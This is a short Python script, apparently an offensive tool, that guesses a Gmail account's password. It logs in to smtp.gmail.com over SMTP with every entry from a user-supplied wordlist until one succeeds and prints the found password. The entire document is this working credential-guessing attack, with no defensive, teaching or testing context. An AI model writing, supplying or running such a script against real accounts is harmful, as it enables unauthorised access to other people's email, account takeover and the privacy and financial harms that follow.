import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("[*] Email:\t")
passfile = input("[*] Pass file location:\t")
file = open(passfile,"r")

for passw in file:
	passw = passw.strip("\n")
	try:
		smtpserver.login(user, passw)
		print(colored("[+] Pass Found: %s" %passw, "green"))
		break
	except smtplib.SMTPAuthenticationError:
		print(colored("[+] Wrong Password: '" + passw + "'", "red"))
